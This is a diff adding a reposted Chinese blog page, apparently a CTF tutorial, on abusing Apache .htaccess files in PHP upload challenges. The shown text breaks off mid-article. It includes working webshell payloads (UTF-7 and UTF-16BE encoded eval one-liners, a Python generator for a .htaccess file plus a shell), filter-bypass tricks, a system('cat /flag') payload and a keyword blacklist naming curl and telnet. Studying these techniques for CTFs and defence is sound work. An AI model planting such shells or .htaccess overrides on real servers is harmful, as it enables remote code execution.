@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.getflag.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言文章首发i春秋：传送门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【转载】CTF中.htaccess文件的利用">
+<meta property="og:url" content="https://www.getflag.cn/2020/10/10/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="kawhi">
+<meta property="og:description" content="前言文章首发i春秋：传送门">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20201009174454764.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20201009174551830.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914145441825.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912161335052.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912203337857.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912205633136.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913153138736.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912214739443.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913195738007.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913213030247.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913214213289.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913215402401.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913161007880.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914111547802.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914111716381.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914164603191.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912223549012.png">
+<meta property="article:published_time" content="2020-10-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-25T03:18:23.597Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20201009174454764.png">
+
+<link rel="canonical" href="https://www.getflag.cn/2020/10/10/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【转载】CTF中.htaccess文件的利用 | kawhi</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">早上好，打工人</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fab fa-pagelines fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/10/10/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="PHP是世界上最好的语言">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【转载】CTF中.htaccess文件的利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-10 00:00:00" itemprop="dateCreated datePublished" datetime="2020-10-10T00:00:00+08:00">2020-10-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-25 11:18:23" itemprop="dateModified" datetime="2020-10-25T11:18:23+08:00">2020-10-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>12 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章首发i春秋：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-58841-1-1.html">传送门</a><a id="more"></a></p>
+<p>.htaccess文件是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以在所在文件夹和子文件下改变php.ini的配置。</p>
+<p>在CTF的题目中，如果能够上传或者写入一个.htaccess，我们就可以做到比如说绕过WAF，以及文件包含等操作，因为之前打羊城杯看到.htaccess的文件的利用，就想把我自己之前遇到过的各种用法总结一下。</p>
+<p>.htaccess文件是默认开启的，如果没有启动.htaccess文件的话，需要修改配置文件httpd.conf中的以下两点：</p>
+<ul>
+<li><p>把AllowOverride None修改为：AllowOverride All</p>
+</li>
+<li><p>把LoadModule rewrite_module modules/mod_rewrite.so这句话前面的<code>#</code>去掉。</p>
+</li>
+</ul>
+<h2 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h2><p>在CTF中.htaccess文件最常用的地方就是文件上传的题目了，如果题目中使用的是黑名单机制，即限制上传<code>php</code>，<code>pthml</code>，<code>pht</code>等后缀，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php，就可以导致远程代码执行。</p>
+<h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><p>比如在<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a>的第四关就可以使用这种方法绕过，首先是限制了php的后缀，如图所示shell.php不允许上传。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20201009174454764.png" alt="image-20201009174454764"></p>
+<p>但是题目并没有限制.htaccess文件的上传，我们可以上传一个.htaccess文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>AddType可以指示文件管理系统，对指定后缀文件以选定的文件类型解析，整句话的作用就是让jpg格式的文件解析为php文件。</p>
+<p>上传完.htaccess文件之后再上传一个写入一句话木马的shell.jpg文件，尝试连接蚁剑。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20201009174551830.png" alt="image-20201009174551830"></p>
+<p>发现已经成功连接上了，说明我们上传的.htaccess文件已经成功让jpg格式的文件解析为php了。</p>
+<h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><p>除了AddType之外还有AddHandler，例如我们想将txt文件后缀解析为php运行，可以在.htaccess中写下以下两行的其中一行。</p>
+<ul>
+<li>AddHandler php5-script .txt</li>
+<li>AddHandler php7-script .txt</li>
+</ul>
+<p>意思是指定扩展名为 .php 的文件应被  php5-srcipt/php7-srcipt 处理器来处理。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200914145441825.png"></p>
+<p>可以看到写入前后的对比，后者成功把txt文件解析为php文件。</p>
+<p>一般这种可以配合着其他的语句来使用，比如说[de1ctf 2020]Check in的这道题，过滤了如下黑名单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>
+
+<p> 我们可以上传一个.htaccess内容如下，主要让txt文件解析为php文件，再把flag包含进来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">hp5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p>再上传一个1.txt就能加载/flag内容。不过这里涉及到了.htaccess的换行绕过和文件包含，下面都会提到。</p>
+<h3 id="SetHandler"><a href="#SetHandler" class="headerlink" title="SetHandler"></a>SetHandler</h3><p>.htaccess文件解析还有另外一种常见写法就是利用SetHandler，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>这样所有文件都会当成php来解析，如果要指定某一个类型文件的话，可以写</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将shell.jpg解析为php文件，同时这里可以使用正则匹配文件比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.ph.*$&quot;&gt;</span><br><span class="line">  SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就是匹配所有的.ph开头的后缀文件。</p>
+<p>SetHandler还有一种用法就是在.htaccess写入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure>
+
+<p>然后再访问<code>http://ip/server-status</code>即可查看所有访问本站的记录，[de1ctf 2020]Check in这道题的官方wp中提到了这种方式去获取信息。</p>
+<h2 id="htaccess的一些绕过"><a href="#htaccess的一些绕过" class="headerlink" title=".htaccess的一些绕过"></a>.htaccess的一些绕过</h2><ul>
+<li>绕过关键字</li>
+</ul>
+<p>像上面的upload-labs的第四关内容中如果过滤了<code>application</code>关键字，因为.htaccess支持换行编写，我们可以使用反斜杠换行绕过的方法，如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType appli\</span><br><span class="line">cation&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>绕过<code>exif_imagetype</code>函数</li>
+</ul>
+<p><code>exif_imagetype()</code> 的作用是读取一个图像的第一个字节并检查其签名。</p>
+<p>比如[SUCTF 2019]EasyWeb这道题就有这个函数，关键代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>要注意的是通常我们会在上传文件中加上gif的文件头GIF89a去绕过，但是.htaccess文件用这种方法虽然能上传成功，但是无法生效。我们可以在.htaccess文件前面加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_width xxx(大小)</span><br><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_height xxx(大小)</span><br></pre></td></tr></table></figure>
+
+<p>这里的原理其实是伪造为xbm文件，xbm文件是一种图片格式的文件。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912161335052.png"></p>
+<p>在php的官方文档中，<code>exif_imagetype()</code>是可以支持xbm类型的文件的。</p>
+<ul>
+<li>绕过拼接字符</li>
+</ul>
+<p>比如最近的羊城杯上的一道题目，其中部分代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename, $content . &quot;\nHello, world&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这一题的思路是利用.htaccess文件把恶意代码包含进index.php里面，但是在变量<code>$content</code>后面拼接了一个<code>&quot;\nHello, world&quot;</code>，这样的话会不符合.htaccess文件的语法，导致服务器报一个500错误，这时候我们可以使用反斜杠先把<code>\n</code>转义，再在加入的恶意代码前面加上一个<code>#</code>注释掉后面的内容，这样的话就可以绕过<code>&quot;\nHello, world&quot;</code>，从而使得.htaccess符合语法。</p>
+<p>最终payload结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fil\</span><br><span class="line">e .htaccess</span><br><span class="line">#&lt;?php system(&#39;cat &#x2F;fla&#39;.&#39;g&#39;);?&gt;\&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>这里要注意的是在传参的时候都是要url编码的。</p>
+<h2 id="htaccess的常见用法"><a href="#htaccess的常见用法" class="headerlink" title=".htaccess的常见用法"></a>.htaccess的常见用法</h2><p>首先了解一下php_value和php_flag这两个东西</p>
+<ul>
+<li><p><code>php_value</code>：设定指定的值，但不能设定布尔值。</p>
+</li>
+<li><p><code>php_flag</code>：用来设定布尔值的配置指令。</p>
+</li>
+</ul>
+<p>这两个可以用来设置指令的值，使得在 Apache 配置文件内部修改 PHP 的配置，那么这些指令有哪些呢，比如说<code>auto_prepend_file</code>，<code>display_errors</code>等等，具体的话参考官方给出的：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">php.ini 配置选项列表</a></p>
+<p>当然上面说的这两个都是可以用于.htaccess中的，同样功能的还有<code>php_admin_value</code>和<code>php_admin_flag</code>，但是这两个无法用于.htaccess中。</p>
+<p>下面介绍两个最常见的用法：</p>
+<h3 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h3><p>如果对文件内容进行过滤了<code>&lt;?</code>，同时版本php7已经抛弃了<code>&lt;script language=&#39;php&#39;&gt;</code>和&lt;<code>%</code>，使得我们无法利用php其他风格的标签去绕过。这里可以考虑在.htaccess中设置UTF-7字符或者其他字符进行绕过。</p>
+<p>我们可以先上传一个shell.jpg内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_width 1337</span><br><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_height 1337</span><br><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure>
+
+<p>第三句是经过UTF-7编码的，在线UTF-7编码：<a target="_blank" rel="noopener" href="http://toolswebtop.com/text/process/encode/utf-7">UTF-7 Encoder</a></p>
+<p>我们接下来要做的就是利用.htaccess文件把他进行UTF-7解码</p>
+<p>我们再写入一个.htaccess文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_width 1337</span><br><span class="line">#define 4c11f3876d494218ff327e3ca6ac824f_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>
+
+<p>前3行在上面已经讲过，这里不再赘述。</p>
+<p>第4行中的<code>php_flag</code>，后面跟着display_errors on，本句的作用是关闭错误提示，也就是差不多相当于<code>error_reporting(0);</code></p>
+<p>第5行中的<code>php_flag</code>，把zend.multibyte的值设置为1，原因是在使用 UTF-7、SJIS、BIG5 等在多字节字符串数据中包含特殊字符的字符编码是要启用zend.multibyte的，如果是UTF-8编码的话则不需要这个选项。</p>
+<p>最后一句是关键点了，<code>php_value</code>中设置了zend.script_encoding “UTF-7”，本句的作用是对上传的文件进行一个UTF-7的解码。</p>
+<p>这里我直接在本地phpstudy直接写入.htaccess和shell.jpg，测试了一下是可行的</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912203337857.png" alt="image-20200912203337857"></p>
+<ul>
+<li>要注意的是，在本地phpstudy写入.htaccess文件的话，php的版本要选择不带nts的。</li>
+</ul>
+<p>在[SUCTF 2019]EasyWeb这道题里面就可以用到这个方法，但不局限于这种，在看其他师傅的writeup中，发现本题也可以通过设置utf-16be来进行绕过，这里借用一下网上的一键生成.htaccess脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">	phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">	phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">	phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">	htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.write(SIZE_HEADER)</span><br><span class="line">	htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .lethe\n&#x27;</span>)</span><br><span class="line">	htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">	htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">	htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">&quot;shell.lethe&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="进行文件包含"><a href="#进行文件包含" class="headerlink" title="进行文件包含"></a>进行文件包含</h3><p>在刚刚提到的php_value的指令中，也就是php.ini中有两项：</p>
+<p>在所有页面的顶部与底部require文件</p>
+<ul>
+<li><code>auto_prepend_file</code> 在页面顶部加载文件</li>
+<li><code>auto_append_file</code> 在页面底部加载文件</li>
+</ul>
+<p>我们可以利用这个将1.php文件包含进所有的php页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file 1.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200912205633136.png"></p>
+<p>可以看到1.php成功包含进去shell.php里面了。</p>
+<p>这里我们甚至可以利用伪协议配合做一个编码，.htaccess如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>把shell.jpg进行base64解码后再包含进所有的php页面。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/CTF%E4%B8%AD.htaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20200913153138736.png"></p>
+<p>如图可以看到在1.php页面已经可以看到shell.jpg的phpinfo了。</p>
+<p>这里以最近羊城杯的一道题目为例子，这道题的原题是<code>X-NUCA&#39;2019—Ezphp</code>。</p>
+<p>题目的源码为：</p>
